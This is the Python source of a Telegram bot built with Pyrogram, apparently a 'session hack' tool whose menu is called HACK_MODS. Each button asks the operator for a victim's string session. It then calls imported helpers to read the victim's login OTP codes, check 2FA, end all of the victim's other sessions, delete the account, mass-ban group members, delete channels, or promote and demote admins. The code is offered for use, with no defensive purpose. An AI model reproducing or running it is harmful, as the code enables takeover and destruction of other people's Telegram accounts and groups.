import os
from helper.steve import (
    API_ID, API_HASH,
    users_gc, user_info, banall, get_otp, join_ch,
    leave_ch, del_ch, check_2fa, terminate_all, del_acc,
    piromote, demote_all
)
from helper.data import HACK_MODS
from pyrogram import Client, filters
from pyrogram.types import CallbackQuery


@Client.on_callback_query(filters.regex("^A$"))
async def a_callback(client: Client, query: CallbackQuery):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ")
    ch = await users_gc(session.text)
    if len(ch) > 3855:
        with open("session.txt", "w") as file:
            file.write(ch)
        await client.send_document(chat_id, "session.txt")
        os.remove("session.txt")
    else:
        await query.message.reply_text(
            ch + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ ♡**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True
        )


@Client.on_callback_query(filters.regex("^B$"))
async def b_callback(client: Client, query: CallbackQuery):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ.")
    info = await user_info(session.text)
    await query.message.reply_text(
        info + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ ♡**",
        reply_markup=HACK_MODS,
        disable_web_page_preview=True
    )


@Client.on_callback_query(filters.regex("^C$"))
async def c_callback(client: Client, query: CallbackQuery):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ.")
    gc = await client.ask(chat_id, "ɢɪᴠᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ɪᴅ ᴏʀ @ᴜsᴇʀɴᴀᴍᴇ")
    hehe = await banall(session.text, gc.text)
    await query.message.reply_text(
        hehe + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ ♡**",
        reply_markup=HACK_MODS,
        disable_web_page_preview=True
    )


@Client.on_callback_query(filters.regex("^D$"))
async def d_callback(client: Client, query: CallbackQuery):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ")
    hehe = await get_otp(session.text)
    await query.message.reply_text(
        hehe + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ ♡**",
        reply_markup=HACK_MODS,
        disable_web_page_preview=True
    )


@Client.on_callback_query(filters.regex("^E$"))
async def e_callback(client: Client, query: CallbackQuery):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ")
    gc = await client.ask(chat_id, "ɢɪᴠᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ɪᴅ/@ᴜsᴇʀɴᴀᴍᴇ")
    hehe = await join_ch(session.text, gc.text)
    await query.message.reply_text(hehe + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ ♡**", reply_markup=HACK_MODS)


@Client.on_callback_query(filters.regex("^F$"))
async def f_callback(client: Client, query: CallbackQuery):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "ɢɪᴠᴇ ᴍᴇ sᴛʀɪɴɢ")
    gc = await client.ask(chat_id, "ɢɪᴠᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ɪᴅ/@ᴜsᴇʀɴᴀᴍᴇ")
    hehe = await leave_ch(session.text, gc.text)
    await query.message.reply_text(hehe + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ ♡**", reply_markup=HACK_MODS)


@Client.on_callback_query(filters.regex("^G$"))
async def g_callback(client: Client, query: CallbackQuery):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "ɢɪᴠᴇ ᴍᴇ sᴛʀɪɴɢ")
    gc = await client.ask(chat_id, "ɢɪᴠᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ɪᴅ/@ᴜsᴇʀɴᴀᴍᴇ")
    hehe = await del_ch(session.text, gc.text)
    await query.message.reply_text(hehe + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ ♡**", reply_markup=HACK_MODS)


@Client.on_callback_query(filters.regex("^H$"))
async def h_callback(client: Client, query: CallbackQuery):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ")
    hehe = await check_2fa(session.text)
    await query.message.reply_text(hehe + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ ♡**", reply_markup=HACK_MODS)


@Client.on_callback_query(filters.regex("^I$"))
async def i_callback(client: Client, query: CallbackQuery):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "ɢɪᴠᴇ ᴍᴇ sᴛʀɪɴɢ")
    hehe = await terminate_all(session.text)
    await query.message.reply_text(hehe + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ ♡**", reply_markup=HACK_MODS)


@Client.on_callback_query(filters.regex("^J$"))
async def j_callback(client: Client, query: CallbackQuery):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "ɢɪᴠᴇ ᴍᴇ sᴛʀɪɴɢ")
    hehe = await del_acc(session.text)
    await query.message.reply_text(hehe + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ ♡**", reply_markup=HACK_MODS)


@Client.on_callback_query(filters.regex("^K$"))
async def k_callback(client: Client, query: CallbackQuery):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "ɢɪᴠᴇ ᴍᴇ sᴛʀɪɴɢ")
    user_id = await client.ask(chat_id, "ɢɪᴠᴇ ᴜsᴇʀ ɪᴅ/@ᴜsᴇʀɴᴀᴍᴇ")
    gc_id = await client.ask(chat_id, "ɢɪᴠᴇ ɢʀᴏᴜᴘ ɪᴅ/@ᴜsᴇʀɴᴀᴍᴇ")
    hehe = await piromote(session.text, gc_id.text, user_id.text)
    await query.message.reply_text(hehe + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ ♡**", reply_markup=HACK_MODS)


@Client.on_callback_query(filters.regex("^L$"))
async def l_callback(client: Client, query: CallbackQuery):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "ɢɪᴠᴇ ᴍᴇ sᴛʀɪɴɢ")
    gc_id = await client.ask(chat_id, "ɢɪᴠᴇ ɢʀᴏᴜᴘ ɪᴅ/@ᴜsᴇʀɴᴀᴍᴇ")
    hehe = await demote_all(session.text, gc_id.text)
    await query.message.reply_text(hehe + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ ♡**", reply_markup=HACK_MODS)
